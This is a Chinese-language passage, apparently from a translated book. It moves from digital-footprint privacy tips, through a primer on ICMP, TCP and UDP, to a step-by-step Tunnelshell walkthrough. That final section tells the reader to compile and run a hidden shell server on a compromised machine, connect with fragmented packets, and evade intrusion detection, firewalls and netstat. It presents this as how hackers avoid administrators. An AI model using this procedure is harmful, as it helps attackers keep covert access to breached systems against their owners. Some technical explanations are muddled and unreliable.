    在互联网上搜索申请人已成为雇主在招聘之前的一项惯做法。所有这些信息都由 `Google` 等搜索引擎提供，任何搜索你的人都能看到。如果你在网络上搜索自己，可能会发现你注册过账户的所有网站。你还应该搜索图片。了解你的数字足迹是控制它的第一步。


    ## 2. 停用你过旧的社交媒体账户并检查隐私设置

    `Facebook`、`Google+`、`LinkedIn`、`Twitter`、`MySpace` 等都是可以挖掘个人信息的社交媒体网站。如果你的隐私设置不够严密，查看者就可以看到你的照片、状态更新以及涉及你个人生活的帖子。你应该始终记住，开放式网络会忘记上下文，你的帖子可能会被误解。多年前发生的事件可能会阻碍你的前景。尽管你的个人生活与职业生活是分开的，但你的个人资料可能不会那些试图雇你的人感兴趣。你应该始终检查你活跃账户的隐私设置。例如，如果是你的
    `Facebook` 账户，你可以进入页面右上角的帐户设置，并从列表中选择隐私选项。在这里，你可以决定谁可以访问你的信息，谁可以使用你的手机号或电子邮件地址搜索你等。


    在 `Twitter` 的情况下，你可以点击个人资料右上角的头像来进入设置。这为你提供了一系列帐户选项，你还可以将个人资料设为私密。不添加姓氏或使用不同的姓氏可以完全隐藏你的账户。


    ## 3. 隐藏其他信息或添加虚假信息

    如果你希望保持低调，那么在处理社交媒体网站的账户时，诚实并不是最佳策略。某些社交媒体网站只允许你停用账户，而不能完全删除它。在这种情况下，你应该尽可能地更改你的信息。在停用账户之前，应该更改个人资料名称、电子邮件地址和头像等信息。这样，如果有人尝试搜索你，他们只能看到你最近更新的信息。


    ## 4. 联系网站管理员

    你可以通过联系网站管理员来删除你的信息，这是可用最佳方案之一。你可以向他们发送数据包（ping）或邮件，详细说明你的情况，如果他们认为你的理由合理，他们可能会帮助你删除信息。你必须通过从注册电话号码给他们打电话，或从注册的电子邮件地址发送邮件来确认该账户归属。


    ## 5. 取消邮件列表订阅

    始终记住，邮件列表会留下可以追溯到你的线索。通过取消此类邮件列表订阅，你可以中断这些连接。这样做也有助于清理主收件箱。


    ## 6. 拥有一个备用电子邮件账户

    如今大多数服务在注册网站之前都需要你提供电子邮件地址。在此类网站上注册时，创建一个备用电子邮件账户而不是提供主邮箱地址是明智的。他们有时会坚持向你发送推销邮件和营销活动邮件。通过使用备用电子邮件地址，你可以保持你的数字足迹的整洁。


    ## 7. 考虑“被遗忘权”。

    欧洲国家最近实施了“被遗忘权”政策。通过这项政策，你可以从公开显示你信息的搜索引擎中删除信息。`Google` 删除了许多此类链接。


    ## 8. 检查电子商务和零售账户

    当你不再使用 `eBay` 或 `Amazon` 等零售账户，或者当你创建了新账户并停止使用旧账户时，考虑删除这些账户以及存储在其中的财务数据。针对大型零售商及其服务的网络攻击已变得十分常见。如果你不再使用这些账户，就没有必要在公司服务器上保留你的敏感数据。删除它们是明智的。


    ## 9. 掩盖踪迹

    大型 IT 公司如 `Apple` 和 `Google` 最近声称他们正在增强基础加密服务。借此，有许多方法可以让你变得难以被追踪。尽管有 NSA 的指控，对于正常使用，使用
    `Internet Explorer` 的无痕模式、`Google Chrome` 和 `Firefox` 的隐私窗口将有助于限制 `cookies` 等追踪数据。


    ## 10. 重新开始

    这可以被视为一种极端行动，即删除上述服务的所有收件箱邮件。为了清除数字足迹，这是最好的方法。虽然只删除一点可能会被遗忘，但在你使用的社交媒体账户中设置更严格的设置、清除收件箱邮件，将有助于你的。……（注：原文此处段落存在多处单词重复和逻辑错乱，译文已根据语意进行了平顺化处理）


    ---


    # 三大协议 - 必读

    在本章中，我将概述 `ICMP`、`TCP` 和 `UDP` 这三个最重要的协议。随后，我将展示如何使用 `Tunnel` 和 `Kali` 创建隐藏通道。


    ### ICMP – 互联网控制消息协议

    `ICMP` 用于 `路由器` 等设备报告错误并生成消息。`ICMP` 会创建消息并发送它们，指示 `IP` 数据包的停止。任何网络设备都可以发送这些消息、接收并处理它们。`ICMP`
    被归类为从系统到另一个系统的传输协议。`ICMP` 经常被网络管理员用于排查互联网连接。因为它是主要协议之一，`ICMP` 经常被`主机`或`路由器`用于告知其他设备任何错误或更新。`IPv4`
    和 `IPv6` 使用类似的版本称为 `ICMPv4` 和 `ICMPv6`。


    `ICMP` 消息以数据报（datagrams）的形式发送，并带有 `IP` 头部。`ICMP` 数据包位于 `IP` 数据部分。`ICMP` 消息还有原始消息的
    `IP` 头部，以便接收者始终哪些包失败了。`IP Protocol 1` 是复杂的，具有三个字段：

    - 类型（type）：用于识别 `ICMP` 消息

    - 代码（code）：包含更多关于 `type` 字段的信息

    - 校验和（checksum）：用于发现消息传输过程中引入的错误


    在这些字段之后是 `ICMP` 数据和 `IP` 头部，显示哪些包失败了。`ICMP` 也被用作执行 `DoS` 攻击的方法，发送比 `IP` 允许的最大字节数更大的
    `IP` 包。


    ### TCP – 传输控制协议

    `TCP` 是建立和维护应用程序交换数据的的标准。`TCP` 与 `IP` 协同工作，这定义了计算机相互发送数据包的方式。`IP` 和 `TCP` 共同定义了互联网的规则。`TCP`
    是一种面向连接的协议，这意味着连接一旦建立就会持续到两端完成消息交换。`TCP` 将决定如何将应用程序数据拆分成网络可以交付的包。它还将数据包发送到网络层并从该层接收，管理控制流，因为它设计用于提供无错误的数据传输，它将处理损坏或丢失的包的重传，并确认所有到达的包。


    `TCP` 负责覆盖 `OSI`（开放系统互连）通信模型的传输层（第 4 层）和会话层（第 5 层）的部分。例如，网络服务器使用 `HTTP` 协议将 HTML
    文件发送给客户端。`HTTP` 层请求连接并发送文件。`TCP` 栈随后会将该文件划分为数据包，给每个包分配编号，并逐一个发送到 `IP` 层以便交付。客户端等待所有数据包，然后将它们全部组合成一个文件。


    ### UDP – 用户数据报协议

    `UDP` 是 `TCP` 的替代方案，主要用于建立容错丢失和低延迟的连接。`TCP` 和 `UDP` 均运行在互联网协议之上，通常被称为 `TCP/IP`
    或 `UDP/IP`。两种协议都发送数据报，即短数据包。`UDP` 提供了 `IP` 不具备的服务：端口号（有助于区分不同的请求）和校验和（Checksum，具有检查数据是否完备到达的能力）。`TCP`
    是大多数互联网连接的主导协议，这是因为它可以将大内存拆分为单个数据包，检查丢失的包并重新发送，最后按正确顺序重组。相比之下，`UDP` 只发送包，意味着它占用的带宽较少且延迟较低。然而，数据可能会丢失或按错误顺序接收。`UDP`
    适用于对延迟极其敏感的网络应用，如视频和语音通信，其中即使数据丢失也不会太影响质量。`UDP` 也用于需要数据无损传输的场景，通过错误纠正技术提供更好的质量。`UDP`
    的传输率高于 `TCP`。


    ### 如何使用 Tunnelshell 创建几乎不可检测的隐藏通道

    通常情况下，黑客正在寻找网络或系统中受保护的信息，这可能是银行卡号、个人身份识别信息或知识产权、蓝图等。虽然你可能进入系统，但问题是，你在那里做什么？黑客需要一种无法被安全服务或管理员检测的方法。他们使用一种名为
    `tunnels` 的工具。


    ### Tunnelshell 如何工作

    `tunnels` 是一个巧妙的程序，仅运行在被攻破的服务器上。许多企业服务器运行于 `Linux`、`Solaris`、`HP UX`、`AIX` 等发行版。`tunnels`
    支持多种协议，包括 `UDP`、`TCP` 和 `ICMP`，它可以拆分包以绕过入侵检测系统和防火墙。在 `UDP` 和 `TCP` 模式下，`tunnels`
    不需要绑定端口，所以如果运行 `netsat`，它不会显示任何开放端口——因为 `IP` 地址已经执行了三次握手。在 `ICMP` 模式下，`tunnels`
    将使用 `ICMP` 请求/应答来传输数据，因为这将被显示为系统间的持续 `ping`。许多防火墙和路由器会阻止进入的 `ICMP`，但很少阻止传出的 `ICMP`
    和用户。


    ### 如何使用 Tunnel shell 用于隐藏通道

    你需要下载 `Kali` 来进行此操作，并且 `Tunnel shell` 是可能的。在正常情况下，我们会使用 `apt-get` 命令。最简单的方法是下载扩展名为
    `.tgz` 的压缩文件，这意味着在使用之前必须进行解压和解 tar。必须将其下载到目标系统。将其放在你任何目录中，记住并在那里运行命令：


    ```bash

    tar xvfz tunnelshell.tgz

    ```


    ### 解 tar 和解压

    在提示符输入以下命令来解包 `tunnelshell`：

    ```bash

    make

    ```


    ### 在目标上激活 Tunnelshell

    现在 `tunnelshell` 已在目标上编译，你只需要在提示符输入：

    ```bash

    ./tunneld

    ```

    这将在目标上开启服务器。当激活 `Tunnel` 时没有使用开关，它将使用默认配置的包分。这种方法的巧妙之处在于包被拆分为碎片并在到达目的地时重组，这是绕过几乎所有
    IDS 和防火墙的最佳方法之一。


    ### 连接到 Tunnel

    只需输入：

    ```bash

    ./tunnel -t frag 192.168.89.191

    ```

    - `-t` 是隧道类型之前的开关

    - `frag` 定义类型

    - `192.168.89.191` 是此情况下目标的 IP 地址


    此时 `tunnelshell` 将连接，但你不会得到命令提示符；而是得到空行。现在你可以输入任何 Linux 命令，输出将像你在 Linux 提示符下工作一样。例如，输入
    `pwd` 查看工作目录，返回将是隧道在目标上运行的目录。如果你现在输入 `ls -l`，将获得目录列表，现在你可以输入任何 Linux 命令。


    ### 尝试在目标上检测 Tunnelshell

    现在你有了隧道，是时候看看目标能够检测到它了。去目标系统，作为系统管理员查看是否能找到隧道。用 `netsat` 尝试——这显示了计算机上所有的连接，但不应该能看到
    `tunnelshell`。


